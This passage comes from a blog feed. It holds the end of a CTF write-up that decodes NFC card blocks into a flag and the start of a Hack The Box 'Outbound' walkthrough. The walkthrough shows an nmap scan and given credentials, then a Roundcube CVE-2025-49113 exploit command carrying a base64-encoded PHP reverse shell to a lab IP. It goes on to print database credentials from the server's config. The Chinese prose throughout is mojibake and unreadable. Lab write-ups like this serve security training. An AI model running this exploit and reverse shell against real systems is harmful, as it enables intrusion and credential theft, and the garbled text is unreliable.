class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">56</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">57</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">58</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">59</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">60</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">61</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">62</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">63</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><br></code></pre></td></tr></table></figure><p>è„šæœ¬è½¬åŒ–ä¸º ASCII å­—ç¬¦</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">hex_line</span>):<br>    <span class="hljs-keyword">try</span>:<br>        bytes_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_line)<br>        ascii_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytes_data)<br>        <span class="hljs-keyword">return</span> ascii_str<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_nfc_blocks</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br><br>    ascii_blocks = &#123;&#125;<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;Block (\d+): ([0-9A-Fa-f ]+)&#x27;</span>, line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            block_num = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>            hex_data = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>).strip()<br>            ascii_str = hex_to_ascii(hex_data)<br>            ascii_blocks[block_num] = ascii_str<br><br>    <span class="hljs-keyword">return</span> ascii_blocks<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    input_file = <span class="hljs-string">&#x27;Card.nfc&#x27;</span><br>    blocks = parse_nfc_blocks(input_file)<br><br>    <span class="hljs-keyword">for</span> block_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(blocks):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Block <span class="hljs-subst">&#123;block_num:02d&#125;</span>: <span class="hljs-subst">&#123;blocks[block_num]&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>æ¯ 4 ä¸ª block ä¸€ç»„ï¼Œç¬¬ 4-8 ä¸ª blockä¸­çš„æ˜æ–‡å°±æ˜¯ flagï¼Œç¬¬ 7 ä¸ª block æ²¡ç”¨</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Block <span class="hljs-number">00</span>: my_card.D<span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">01</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">02</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">03</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span>xw..sdIeAQ<br>Block <span class="hljs-number">04</span>: <span class="hljs-number">.0</span>..,T.enma5t3r1<br>Block <span class="hljs-number">05</span>: ng_s7ruc7ur3_0f_<br>Block <span class="hljs-number">06</span>: m1far3_card_pXLF<br>Block <span class="hljs-number">07</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">08</span>: OtFJuiKCkbPhNPzV<br>Block <span class="hljs-number">09</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">10</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">11</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">12</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">13</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">14</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">15</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">16</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">17</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">18</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">19</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">20</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">21</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">22</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">23</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">24</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">25</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">26</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">27</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">28</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">29</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">30</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">31</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">32</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">33</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">34</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">35</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">36</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">37</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">38</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">39</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">40</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">41</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">42</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">43</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">44</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">45</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">46</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">47</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">48</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">49</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">50</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">51</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">52</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">53</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">54</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">55</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">56</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">57</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">58</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">59</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">60</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">61</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">62</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">63</span>: rviLgEpjiNsdIeAQ<br></code></pre></td></tr></table></figure><p>å› æ­¤æ‹¼æ¥åflagæ˜¯</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;enma5t3r1ng_s7ruc7ur3_0f_m1far3_card_pXLFOtFJuiKCkbPhNPzV&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç¬¬ä¸€æ¬¡æ¥è§¦å…³äºé¸¿è’™çš„ï¼Œå¤ç°ä¹Ÿè¿˜æ˜¯å­¦åˆ°äº†æŒºå¤šä¸œè¥¿</p><p>é¸¿è’™åç¼–è¯‘å·¥å…·ï¼š <a href="https://github.com/ohos-decompiler/abc-decompiler">https://github.com/ohos-decompiler/abc-decompiler</a></p>]]></content>
    
    
    <categories>
      
      <category>åªå…³äº Reverse</category>
      
      <category>èµ›é¢˜å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse OpenHarmony</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-OutBound</title>
    <link href="/2025/07/17/HTB-OutBound/"/>
    <url>/2025/07/17/HTB-OutBound/</url>
    
    <content type="html"><![CDATA[<h1 id="Outbound"><a href="#Outbound" class="headerlink" title="Outbound"></a>Outbound</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">As</span> <span class="hljs-keyword">is</span> common <span class="hljs-keyword">in</span> <span class="hljs-type">real</span> life pentests, you will <span class="hljs-keyword">start</span> the Outbound <span class="hljs-type">box</span> <span class="hljs-keyword">with</span> credentials <span class="hljs-keyword">for</span> the <span class="hljs-keyword">following</span> account tyler / LhKL1o9Nm3X2<br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:<span class="hljs-built_in">df</span> (ECDSA)<br>|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:<span class="hljs-built_in">df</span>:38:b0 (ED25519)<br>80/tcp open  http    nginx 1.24.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://mail.outbound.htb/<br>|_http-server-header: nginx/1.24.0 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br></code></pre></td></tr></table></figure><p>ä¿©ç«¯å£ï¼Œæœ‰ä¸ªå­åŸŸå <code>mail.outbound.htb</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>ä¸€ä¸ªç½‘é¡µé‚®ç®±ï¼ŒRoundCube</p><img src="https://img.dkdun.cn/v1/2025/12/b00e2c9f9e3c0b8a.png" alt="image-20250715233225435" style="zoom:67%;" /><p>ç”¨ç»™çš„è´¦å·å¯†ç ç™»å½•æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼Œå‘ç°æ˜¯ 1.6.10 ï¼ŒæŸ¥åˆ°æœ‰ä¸€ä¸ª RCE æ¼æ´ï¼Œæ‰¾åˆ°å¯¹åº” CVEï¼ŒCVE-2025-49113 - Roundcube Remote Code Execution</p><h1 id="CVE-2025-49113"><a href="#CVE-2025-49113" class="headerlink" title="CVE-2025-49113"></a>CVE-2025-49113</h1><p>è¿™ä¸ªæ¼æ´éœ€è¦å…ˆç™»å½•ï¼Œç„¶åå‘é€åŒ…å«æ¶æ„ <code>_from</code> å‚æ•°çš„ HTTP è¯·æ±‚æ¥è§¦å‘æ¼æ´</p><p>POCï¼š<a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php CVE-2025-49113.php &lt;url&gt; &lt;username&gt; &lt;password&gt; &lt;<span class="hljs-built_in">command</span>&gt;<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§æ ¼å¼æ‰“ï¼Œåå¼¹ shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php CVE-2025-49113.php http://mail.outbound.htb/ tyler <span class="hljs-string">&quot;LhKL1o9Nm3X2&quot;</span> <span class="hljs-string">&#x27;echo L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE2LjQ1IiwxMjM0KTtleGVjKCIvYmluL2Jhc2ggPCYzID4mMyAyPiYzIik7Jw== | base64 -d | bash&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a5ef8ad3058315c8.png" alt="image-20250716000131046"></p><p>é¦–å…ˆè¯•äº† sudo -lï¼Œä½†æ²¡ç”¨ï¼Œåœ¨ tyler ç”¨æˆ·ä¸‹æ‰¾åˆ°äº†å…³äºæ•°æ®åº“çš„ä¸œè¥¿</p><h1 id="åˆ©ç”¨æ•°æ®åº“æŸ¥æ‰¾-session-ä¸­çš„-password"><a href="#åˆ©ç”¨æ•°æ®åº“æŸ¥æ‰¾-session-ä¸­çš„-password" class="headerlink" title="åˆ©ç”¨æ•°æ®åº“æŸ¥æ‰¾ session ä¸­çš„ password"></a>åˆ©ç”¨æ•°æ®åº“æŸ¥æ‰¾ session ä¸­çš„ password</h1><p>åœ¨ <code>/var/www/html/roundcube/config</code> ç›®å½•ä¸‹çš„ config.inc.php æ–‡ä»¶å‘ç°äº†æ•°æ®åº“ç›¸å…³é…ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> +-----------------------------------------------------------------------+</span><br><span class="hljs-comment"> | Local configuration for the Roundcube Webmail installation.           |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | This is a sample configuration file only containing the minimum       |</span><br><span class="hljs-comment"> | setup required for a functional installation. Copy more options       |</span><br><span class="hljs-comment"> | from defaults.inc.php to this file to override the defaults.          |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | This file is part of the Roundcube Webmail client                     |</span><br><span class="hljs-comment"> | Copyright (C) The Roundcube Dev Team                                  |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | Licensed under the GNU General Public License version 3 or            |</span><br><span class="hljs-comment"> | any later version with exceptions for skins &amp; plugins.                |</span><br><span class="hljs-comment"> | See the README file for a full license statement.                     |</span><br><span class="hljs-comment"> +-----------------------------------------------------------------------+</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$config</span> = [];<br><br><span class="hljs-comment">// Database connection string (DSN) for read+write operations</span><br><span class="hljs-comment">// Format (compatible with PEAR MDB2): db_provider://user:password@host/database</span><br><span class="hljs-comment">// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle</span><br><span class="hljs-comment">// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> for SQLite use absolute path (Linux): &#x27;sqlite:////full/path/to/sqlite.db?mode=0646&#x27;</span><br><span class="hljs-comment">//       or (Windows): &#x27;sqlite:///C:/full/path/to/sqlite.db&#x27;</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;db_dsnw&#x27;</span>] = <span class="hljs-string">&#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;</span>;<br><br><span class="hljs-comment">// IMAP host chosen to perform the log-in.</span><br><span class="hljs-comment">// See defaults.inc.php for the option description.</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;imap_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost:143&#x27;</span>;<br><br><span class="hljs-comment">// SMTP server host (for sending mails).</span><br><span class="hljs-comment">// See defaults.inc.php for the option description.</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost:587&#x27;</span>;<br><br><span class="hljs-comment">// SMTP username (if required) if you use %u as the username Roundcube</span><br><span class="hljs-comment">// will use the current username for login</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_user&#x27;</span>] = <span class="hljs-string">&#x27;%u&#x27;</span>;<br><br><span class="hljs-comment">// SMTP password (if required) if you use %p as the password Roundcube</span><br><span class="hljs-comment">// will use the current user&#x27;s password for login</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_pass&#x27;</span>] = <span class="hljs-string">&#x27;%p&#x27;</span>;<br><br><span class="hljs-comment">// provide an URL where a user can get support for this Roundcube installation</span><br><span class="hljs-comment">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE 